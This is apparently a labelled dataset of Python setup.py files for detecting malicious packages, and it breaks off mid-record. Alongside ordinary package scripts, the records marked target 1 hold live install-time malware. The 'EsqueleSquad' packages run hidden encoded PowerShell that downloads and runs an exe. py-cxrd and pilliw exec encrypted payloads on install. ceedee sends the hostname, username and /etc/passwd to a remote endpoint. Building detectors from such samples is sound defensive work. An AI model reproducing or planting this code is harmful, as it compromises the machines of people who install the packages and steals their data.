{"idx": "selfintmaskreplace-1.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfintmaskreplace',\n    packages = ['modlib'],\n    version = '5.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "frictionless-4.40.6", "func": "import os\nimport io\nfrom setuptools import setup, find_packages\n\n\n# Helpers\n\n\ndef read(*paths):\n    \"\"\"Read a text file.\"\"\"\n    basedir = os.path.dirname(__file__)\n    fullpath = os.path.join(basedir, *paths)\n    contents = io.open(fullpath, encoding=\"utf-8\").read().strip()\n    return contents\n\n\n# Prepare\n\n\nPACKAGE = \"frictionless\"\nNAME = PACKAGE.replace(\"_\", \"-\")\nTESTS_REQUIRE = [\n    \"mypy\",\n    \"moto\",\n    \"black\",\n    # TODO: remove after the fix\n    # https://github.com/klen/pylama/issues/224\n    \"pyflakes==2.4.0\",\n    \"pylama\",\n    \"pytest\",\n    \"ipython\",\n    \"pymysql\",\n    \"livemark\",\n    \"psycopg2\",\n    \"pytest-cov\",\n    \"pytest-vcr\",\n    \"pytest-only\",\n    \"oauth2client\",\n    \"requests-mock\",\n    \"python-dotenv\",\n    \"pytest-timeout\",\n    \"pydoc-markdown\",\n    \"docstring-parser\",\n    \"yattag\",\n]\nEXTRAS_REQUIRE = {\n    \"bigquery\": [\"google-api-python-client>=1.12.1\"],\n    \"ckan\": [\"ckanapi>=4.3\"],\n    \"excel\": [\n        \"openpyxl>=3.0\",\n        \"xlrd>=1.2\",\n        \"xlwt>=1.2\",\n        \"tableschema-to-template>=0.0.12\",\n    ],\n    \"gsheets\": [\"pygsheets>=2.0\"],\n    \"html\": [\"pyquery>=1.4\"],\n    \"json\": [\"ijson>=3.0\", \"jsonlines>=1.2\"],\n    \"ods\": [\"ezodf>=0.3\", \"lxml>=4.0\"],\n    \"pandas\": [\"pandas>=1.0\"],\n    \"s3\": [\"boto3>=1.9\"],\n    \"server\": [\"gunicorn>=20.0\", \"flask>=1.1\"],\n    \"spss\": [\"savReaderWriter>=3.0\"],\n    \"sql\": [\"sqlalchemy>=1.3\"],\n    \"dev\": TESTS_REQUIRE,\n}\nINSTALL_REQUIRES = [\n    \"petl>=1.6\",\n    \"marko>=1.0\",\n    \"pyyaml>=5.3\",\n    \"isodate>=0.6\",\n    \"rfc3986>=1.4\",\n    \"chardet>=3.0\",\n    \"requests>=2.10\",\n    \"jsonschema>=2.5\",\n    \"simpleeval>=0.9.11\",\n    \"stringcase>=1.2\",\n    \"typer[all]==0.5.0\",\n    \"validators>=0.18\",\n    \"python-slugify>=1.2\",\n    \"python-dateutil>=2.8\",\n    \"tableschema-to-template>=0.0.12\",\n    \"tabulate>=0.8.10\",\n    \"jinja2>=3.0.3\",\n]\nREADME = read(\"README.md\")\nVERSION = read(PACKAGE, \"assets\", \"VERSION\")\nPACKAGES = find_packages(exclude=[\"tests\"])\nENTRY_POINTS = {\"console_scripts\": [\"frictionless = frictionless.__main__:program\"]}\n\n\n# Run\n\n\nsetup(\n    name=NAME,\n    version=VERSION,\n    packages=PACKAGES,\n    include_package_data=True,\n    install_requires=INSTALL_REQUIRES,\n    tests_require=TESTS_REQUIRE,\n    extras_require=EXTRAS_REQUIRE,\n    entry_points=ENTRY_POINTS,\n    zip_safe=False,\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    description=\"Data management framework for Python that provides functionality to describe, extract, validate, and transform tabular data\",\n    author=\"Open Knowledge Foundation\",\n    author_email=\"info@okfn.org\",\n    url=\"https://github.com/frictionlessdata/frictionless-py\",\n    license=\"MIT\",\n    keywords=[\n        \"data validation\",\n        \"frictionless data\",\n        \"open data\",\n        \"json schema\",\n        \"json table schema\",\n        \"data package\",\n        \"tabular data package\",\n    ],\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "libpushramosint-2.25", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpushramosint',\n    packages = ['modlib'],\n    version = '9.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-ipware-4.0.2", "func": "#!/usr/bin/env python\n# Learn more: https://github.com/un33k/setup.py\nimport os\nimport sys\n\nfrom codecs import open\nfrom shutil import rmtree\nfrom setuptools import setup\n\n\npackage = 'ipware'\npython_requires = \">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, !=3.5.*\"\nhere = os.path.abspath(os.path.dirname(__file__))\n\nrequires = []\ntest_requirements = []\n\nabout = {}\nwith open(os.path.join(here, package, '__version__.py'), 'r', 'utf-8') as f:\n    exec(f.read(), about)\n\nwith open('README.md', 'r', 'utf-8') as f:\n    readme = f.read()\n\n\ndef status(s):\n    print('\\033[1m{0}\\033[0m'.format(s))\n\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == 'publish':\n    try:\n        status('Removing previous builds\u2026')\n        rmtree(os.path.join(here, 'dist'))\n    except OSError:\n        pass\n\n    status('Building Source and Wheel (universal) distribution\u2026')\n    os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n    status('Uploading the package to PyPI via Twine\u2026')\n    os.system('twine upload dist/*')\n\n    status('Pushing git tags\u2026')\n    os.system('git tag v{0}'.format(about['__version__']))\n    os.system('git push --tags')\n    sys.exit()\n\nsetup(\n    name=about['__title__'],\n    version=about['__version__'],\n    description=about['__description__'],\n    long_description=readme,\n    long_description_content_type='text/markdown',\n    author=about['__author__'],\n    author_email=about['__author_email__'],\n    url=about['__url__'],\n    packages=[package],\n    package_data={'': ['LICENSE']},\n    package_dir={'ipware': 'ipware'},\n    include_package_data=True,\n    python_requires=python_requires,\n    install_requires=requires,\n    license=about['__license__'],\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    cmdclass={},\n    tests_require=test_requirements,\n    extras_require={},\n    project_urls={},\n)\n", "target": 0}
{"idx": "sluheczo-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='sluheczo', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "fancycompleter-0.9.1", "func": "from setuptools import setup\n\nsetup(\n    name='fancycompleter',\n    setup_requires=\"setupmeta\",\n    versioning=\"devcommit\",\n    maintainer=\"Daniel Hahler\",\n    url='https://github.com/pdbpp/fancycompleter',\n    author='Antonio Cuni',\n    author_email='anto.cuni@gmail.com',\n    py_modules=['fancycompleter'],\n    license='BSD',\n    description='colorful TAB completion for Python prompt',\n    keywords='rlcompleter prompt tab color completion',\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Console\",\n        \"License :: OSI Approved :: BSD License\",\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        \"Intended Audience :: Developers\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Topic :: Utilities\",\n        ],\n    install_requires=[\n        \"pyrepl>=0.8.2\",\n        \"pyreadline;platform_system=='Windows'\",\n    ]\n)\n", "target": 0}
{"idx": "py-cxrd-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'XsHorsVNlfNmkUUVGJjtobjygg  jKKCWljJUSRZFeScvcsaL RtqDLmU CrlYzAdBOIlPj yGRaKZiZs'\nLONG_DESCRIPTION = 'wCpSNozNcdGQmdhmATpdGWtIjLZSL tUsYiUPhjSuWeUuJTGpSDtpLwarqJCahBjpXWWXsGkSkritYpGEURPqWXcOWqyeLIrobnnSSNqqbgnV U bveTaSFkVNgKvg RPnnyDoDxaJDzuSiiuANiXojJZ ZzTsiUasdLLoqxcNTvswuzgiKmTqKSpPlpUTzZshBAVRISLpGcqlqKiRxcHFPntakzwDrRffCaGHZRfsPwwyZiONmPT'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'uve4Wkw6R8DNOuH4WE6FQBeczBWdYorE_7jJLivuL9o=').decrypt(b'gAAAAABmA1OONSMqQjBDNxWuxzwTDesv3FGaYMR6IJWdIJjZcevLIhgsV2s7BYV0IgjUBdVhkPwyGxBbVhKCSqY7iR-zQ-BBLMuf1gDaXYaUulU85Vf5HdJSShGjaFWoiS0mNEhO388-GqptwY9RvzwcJMTke9zEPRKa1nXWL1j4L24IdmtU87hmgxcFDGnBUg_ag2Gsu13EpuHbYSTl-cNGF2_uw62UyOhmuGs3Ps4SkmrRkyqcze8='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"py-cxrd\",\n    version=VERSION,\n    author=\"qqPykpaGwDONkT\",\n    author_email=\"loJTiUvXuOFUZORvg@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "pilliw-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'augWIYUVbFkoijEydjgJtxjw'\nLONG_DESCRIPTION = 'GPtNTdWrpmpBMOJOcvRcOIaIJb MsFHUXamWSPsxLlLGcPU RjLIfQqaJ DksqjwkjtCh qfxWqKRfSCAXlHEqaAziHXkaGbHPjmmuoXrVpgIcXHSINRhoQIbYJbAKnQQyytBblhYKOhJvXtsazhZfQekOqpRTyxxCdHoTmkltmDKyWazMAtfsUUFemIplBiZPVYcOpcQuOZmWPxHfmcVhYqTtVVRBaeeabcfiNFDwFGkIDkmjBOpypCtkXxHlsfvyFRqRrsfIzYCaWFYUtGzRGMebCDkHlWEipKmRrJbhnPRgijCDQaFoWkjOxvHKKHFWZxmkmCbi izncHHSJOeIOXMbCfeykGBlXJRYZOCjIjMlJQdMkD'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'3sUqpL_sg9NSd1Ngdh996R03hvOL0DM15iHYpOBQ3vE=').decrypt(b'gAAAAABmA1oUcrItTW32doI1K1K4lcmm2F5J5T7vbjUJzvaMAbJ25Vh9yEPkTT6kaLsdLstZGOjt6DK346zPiauMhc1XnSFlQS7h7RqTSLS3Y-I0k0PPcpglwS2eMwq77tLoDwezSl3TsWtc89G3ceEhUk88eGc0KeSMad3m3iDUNxjScJ3UpF0qWPz-K0zljGK_WTAfE0f2tZZ2qrW08geHMnaF9pXWgQ=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pilliw\",\n    version=VERSION,\n    author=\"kQiTuThO\",\n    author_email=\"hPcGhdCbIkosCQK@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "databand-0.85.9", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\n\nfrom configparser import ConfigParser\n\nimport setuptools\n\n\nHERE = os.path.abspath(os.path.dirname(__file__))\n\n\ndef read_setup_cfg():\n    \"\"\"\n    Build an absolute path from *parts* and and return the contents of the\n    resulting file.  Assume UTF-8 encoding.\n    \"\"\"\n    config_file = os.path.join(HERE, \"setup.cfg\")\n    cp = ConfigParser()\n    cp.read([config_file])\n    return cp\n\n\nsetup_cfg = read_setup_cfg()\nVERSION = setup_cfg.get(\"metadata\", \"version\")\nprint(setup_cfg)\n\n\ndef dbnd_package(name, extras=None):\n    pkg = name\n    if extras:\n        pkg += \"[%s]\" % \",\".join(extras)\n\n    pkg += \"==%s\" % VERSION\n    return pkg\n\n\nEXTRAS_REQUIRE = {\n    \"airflow\": [dbnd_package(\"dbnd-airflow\")],\n    \"airflow_bundle\": [dbnd_package(\"dbnd-airflow\", [\"airflow\"])],\n    \"airflow_1_10_7\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_7\"])],\n    \"airflow_1_10_8\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_8\"])],\n    \"airflow_1_10_9\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_9\"])],\n    \"airflow_1_10_10\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_10\"])],\n    \"airflow_1_10_11\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_11\"])],\n    \"airflow_1_10_12\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_12\"])],\n    \"airflow_1_10_13\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_13\"])],\n    \"airflow_1_10_14\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_14\"])],\n    \"airflow_1_10_15\": [dbnd_package(\"dbnd-airflow\", [\"airflow_1_10_15\"])],\n    \"airflow-auto-tracking\": [dbnd_package(\"dbnd-airflow-auto-tracking\")],\n    \"airflow-versioned-dag\": [dbnd_package(\"dbnd-airflow-versioned-dag\")],\n    \"airflow-export\": [dbnd_package(\"dbnd-airflow-export\")],\n    \"aws\": [dbnd_package(\"dbnd-aws\")],\n    \"azure\": [dbnd_package(\"dbnd-azure\")],\n    \"databricks\": [dbnd_package(\"dbnd-databricks\")],\n    \"docker\": [dbnd_package(\"dbnd-docker\")],\n    \"gcp\": [dbnd_package(\"dbnd-gcp\")],\n    \"hdfs\": [dbnd_package(\"dbnd-hdfs\")],\n    \"mlflow\": [dbnd_package(\"dbnd-mlflow\")],\n    \"qubole\": [dbnd_package(\"dbnd-qubole\")],\n    \"spark\": [dbnd_package(\"dbnd-spark\")],\n    \"postgres\": [dbnd_package(\"dbnd-postgres\")],\n    \"redshift\": [dbnd_package(\"dbnd-redshift\")],\n    \"snowflake\": [dbnd_package(\"dbnd-snowflake\")],\n    \"tensorflow\": [dbnd_package(\"dbnd-tensorflow\")],\n    \"luigi\": [dbnd_package(\"dbnd-luigi\")],\n}\n\n# Aliases:\nEXTRAS_REQUIRE[\"k8s\"] = EXTRAS_REQUIRE[\"docker\"]\n\nsetuptools.setup(\n    name=\"databand\",\n    install_requires=[dbnd_package(\"dbnd\")],\n    extras_require=EXTRAS_REQUIRE,\n)\n", "target": 0}
{"idx": "django-waffle-2.6.0", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='django-waffle',\n    version='2.6.0',\n    description='A feature flipper for Django.',\n    long_description=open('README.rst').read(),\n    author='James Socol',\n    author_email='me@jamessocol.com',\n    url='http://github.com/django-waffle/django-waffle',\n    license='BSD',\n    packages=find_packages(exclude=['test_app', 'test_settings']),\n    include_package_data=True,\n    package_data={'': ['README.rst']},\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "grpc-stubs-1.24.11", "func": "import os\nfrom typing import List\n\nfrom setuptools import find_packages\nfrom distutils.core import setup\n\n__version__ = \"1.24.11\"\n\ndependencies = [\n    \"typing-extensions; python_version<'3.8'\",\n    'grpcio',\n]\n\n\ndef find_stub_files(name: str) -> List[str]:\n    result = []\n    for root, dirs, files in os.walk(name):\n        for file in files:\n            if file.endswith('.pyi') or file == 'py.typed':\n                if os.path.sep in root:\n                    sub_root = root.split(os.path.sep, 1)[-1]\n                    file = os.path.join(sub_root, file)\n                result.append(file)\n    return result\n\n\nwith open('README.md', 'r') as f:\n    readme = f.read()\n\npackage_data = {\n    'grpc-stubs': find_stub_files('grpc-stubs'),\n    'grpc_channelz-stubs': find_stub_files('grpc_channelz-stubs'),\n    'grpc_health-stubs': find_stub_files('grpc_health-stubs'),\n    'grpc_reflection-stubs': find_stub_files('grpc_reflection-stubs'),\n    'grpc_status-stubs': find_stub_files('grpc_status-stubs'),\n}\n\nsetup(\n    name=\"grpc-stubs\",\n    version=__version__,\n    description='Mypy stubs for gRPC',\n    long_description=readme,\n    long_description_content_type='text/x-rst',\n    license='MIT',\n    url=\"https://github.com/shabbyrobe/grpc-stubs\",\n    author=\"Blake Williams\",\n    author_email=\"code@shabbyrobe.org\",\n    py_modules=[],\n    python_requires='>=3.6',\n    install_requires=dependencies,\n    packages=[\n        'grpc-stubs',\n        'grpc_channelz-stubs',\n        'grpc_health-stubs',\n        'grpc_reflection-stubs',\n        'grpc_status-stubs',\n        *find_packages(exclude=['scripts']),\n    ],\n    package_data=package_data,\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8'\n    ]\n)\n", "target": 0}
{"idx": "tppostguistring-2.17", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppostguistring',\n    packages = ['modlib'],\n    version = '3.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ceedee-0.1", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nfrom urllib import request, parse\n\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='0.1',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n", "target": 1}
{"idx": "cx_Oracle-8.3.0", "func": "\"\"\"\nSetup script for cx_Oracle.\n\"\"\"\n\nimport os\nimport pkg_resources\nimport setuptools\nimport sys\n\n# check minimum supported Python version\nif sys.version_info[:2] < (3, 6):\n    raise Exception(\"Python 3.6 or higher is required. \" +\n            \"For python 2, use 'pip install cx_Oracle==7.3'\")\n\n# check minimum supported version of setuptools\npkg_resources.require(\"setuptools>=40.6.0\")\n\n# define build constants\nBUILD_VERSION = \"8.3.0\"\n\n# setup extra link and compile args\nextra_link_args = []\nextra_compile_args = []\nif sys.platform == \"aix4\":\n    extra_compile_args.append(\"-qcpluscmt\")\nelif sys.platform == \"aix5\":\n    extra_compile_args.append(\"-DAIX5\")\nelif sys.platform == \"cygwin\":\n    extra_link_args.append(\"-Wl,--enable-runtime-pseudo-reloc\")\nelif sys.platform == \"darwin\":\n    extra_link_args.append(\"-shared-libgcc\")\n\n# define cx_Oracle sources\nsource_dir = \"src\"\nsources = [os.path.join(source_dir, n) \\\n           for n in sorted(os.listdir(source_dir)) if n.endswith(\".c\")]\ndepends = [\"src/cxoModule.h\"]\n\n# define ODPI-C sources, libraries and include directories; if the environment\n# variables ODPIC_INC_DIR and ODPIC_LIB_DIR are both set, assume these\n# locations contain a compiled installation of ODPI-C; otherwise, use the\n# source of ODPI-C found in the odpi subdirectory\ndpi_include_dir = os.environ.get(\"ODPIC_INC_DIR\")\ndpi_lib_dir = os.environ.get(\"ODPIC_LIB_DIR\")\nif dpi_include_dir and dpi_lib_dir:\n    dpi_sources = []\n    include_dirs = [dpi_include_dir]\n    libraries = [\"odpic\"]\n    library_dirs = [dpi_lib_dir]\nelse:\n    include_dirs = [\"odpi/include\", \"odpi/src\"]\n    dpi_source_dir = os.path.join(\"odpi\", \"src\")\n    dpi_sources = [os.path.join(dpi_source_dir, n) \\\n            for n in sorted(os.listdir(dpi_source_dir)) if n.endswith(\".c\")]\n    depends.extend([\"odpi/include/dpi.h\", \"odpi/src/dpiImpl.h\",\n            \"odpi/src/dpiErrorMessages.h\"])\n    libraries = []\n    library_dirs = []\n\n# setup the extension\nextension = setuptools.Extension(\n        name=\"cx_Oracle\",\n        include_dirs=include_dirs,\n        extra_compile_args=extra_compile_args,\n        define_macros=[(\"CXO_BUILD_VERSION\", BUILD_VERSION)],\n        extra_link_args=extra_link_args,\n        sources=sources + dpi_sources,\n        depends=depends,\n        libraries=libraries,\n        library_dirs=library_dirs)\n\n# perform the setup\nsetuptools.setup(\n        version=BUILD_VERSION,\n        data_files=[ (\"cx_Oracle-doc\", [\"LICENSE.txt\", \"README.txt\"]) ],\n        ext_modules=[extension])\n", "target": 0}
{"idx": "django-two-factor-auth-1.14.0", "func": "from setuptools import find_packages, setup\n\nsetup(\n    name='django-two-factor-auth',\n    version='1.14.0',\n    description='Complete Two-Factor Authentication for Django',\n    long_description=open('README.rst', encoding='utf-8').read(),\n    author='Bouke Haarsma',\n    author_email='bouke@haarsma.eu',\n    url='https://github.com/Bouke/django-two-factor-auth',\n    download_url='https://pypi.python.org/pypi/django-two-factor-auth',\n    license='MIT',\n    packages=find_packages(exclude=('example', 'tests')),\n    install_requires=[\n        'Django>=2.2',\n        'django_otp>=0.8.0',\n        'qrcode>=4.0.0,<7.99',\n        'django-phonenumber-field>=1.1.0,<7',\n        'django-formtools',\n    ],\n    extras_require={\n        'call': ['twilio>=6.0'],\n        'sms': ['twilio>=6.0'],\n        'yubikey': ['django-otp-yubikey'],\n        'phonenumbers': 